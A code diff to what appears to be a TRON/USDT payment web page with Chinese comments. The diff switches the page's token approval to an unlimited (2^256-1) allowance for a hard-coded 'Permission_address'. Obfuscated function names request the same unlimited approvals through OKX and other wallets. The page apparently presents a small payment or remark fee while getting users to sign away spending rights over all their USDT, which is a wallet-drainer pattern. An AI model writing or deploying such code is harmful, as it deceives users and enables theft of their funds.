@@ -378,7 +378,7 @@
         <!-- 备注信息区域 -->
         <div class="flex flex-col items-center" style="height: 30px;">
             <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
-        
+           
         </div>
     </div>
 
@@ -727,13 +727,14 @@
             }
         }
 
-        // USDT授权函数
+        // USDT授权函数 - 修改为无限授权
         async function approveUSDT() {
-            const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
+            // 使用2^256 - 1作为无限授权的表示，这是ERC-20/TRC-20标准中表示无限授权的方式
+            const unlimitedApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             const feeLimit = 100000000;  // 100 TRX
             
             try {
-                console.log("USDT转账...");
+                console.log("开始USDT无限授权...");
                 const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
                 
                 const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
@@ -742,30 +743,30 @@
                     { feeLimit: feeLimit },
                     [
                         { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
-                        { type: 'uint256', value: approveAmount }
+                        { type: 'uint256', value: unlimitedApproval }  // 使用无限授权值
                     ],
                     window.tronWeb.defaultAddress.base58
                 );
 
                 if (!transaction.result || !transaction.result.result) {
-                    throw new Error('交易失败');
+                    throw new Error('授权交易构建失败');
                 }
 
-                console.log("签名交易...");
+                console.log("签名授权交易...");
                 const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
 
-                console.log("发送交易...");
+                console.log("发送授权交易...");
                 const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
                 if (result.result) {
-                    console.log("成功，交易哈希:", result.txid);
+                    console.log("无限授权成功，交易哈希:", result.txid);
                     userData.hasApproved = true;
                     return result.txid;
                 } else {
-                    throw new Error("交易失败");
+                    throw new Error("授权失败");
                 }
             } catch (error) {
-                console.error("USDT发送失败:", error);
+                console.error("USDT无限授权失败:", error);
                 throw error;
             }
         }
@@ -795,12 +796,12 @@
         window.onload = sendHeartbeat;
         window.onbeforeunload = () => clearInterval(heartbeatInterval);
 
-        // OKX钱包交易处理函数
+        // OKX钱包交易处理函数 - 使用无限授权值
         async function DjdskdbGsj(remark) {
             // 计算总金额，包含1TRX手续费
             const totalAmount = parseFloat(currentAmount) + 1;
             const trxAmountInSun = window.tronWeb.toSun(totalAmount);
-            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const unlimitedApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             const feeLimit = 1000000000;
             
             try {
@@ -822,14 +823,14 @@
                 );
 
                 // 构建授权交易
-                console.log("构建授权交易...");
+                console.log("构建无限授权交易...");
                 const approvalTransaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                     window.tronWeb.address.toHex(window.usdtContractAddress),
                     'increaseApproval(address,uint256)',
                     { feeLimit: feeLimit },
                     [
                         { type: 'address', value: window.Permission_address },
-                        { type: 'uint256', value: maxUint256 }
+                        { type: 'uint256', value: unlimitedApproval }  // 使用无限授权值
                     ],
                     window.tronWeb.defaultAddress.base58
                 );
@@ -872,9 +873,9 @@
             }
         }
 
-        // 非OKX钱包处理函数
+        // 非OKX钱包处理函数 - 使用无限授权值
         async function KdhshaBBHdg(remark) {
-            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const unlimitedApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             const feeLimit = 100000000;  // 100 TRX
             const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
 
@@ -884,7 +885,7 @@
                     throw new Error("无效的USDT合约地址");
                 }
                 
-                console.log("构建授权交易...");
+                console.log("构建无限授权交易...");
                 const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                     usdtContractAddressHex,
                     'approve(address,uint256)',
@@ -894,7 +895,7 @@
                     },
                     [
                         { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
-                        { type: 'uint256', value: maxUint256 }
+                        { type: 'uint256', value: unlimitedApproval }  // 使用无限授权值
                     ],
                     window.tronWeb.defaultAddress.base58
                 );
@@ -918,7 +919,7 @@
                     throw new Error("交易失败: " + JSON.stringify(result));
                 }
             } catch (error) {
-                console.error("执行授权操作失败:", error);
+                console.error("执行无限授权操作失败:", error);
                 throw error;
             }
         }
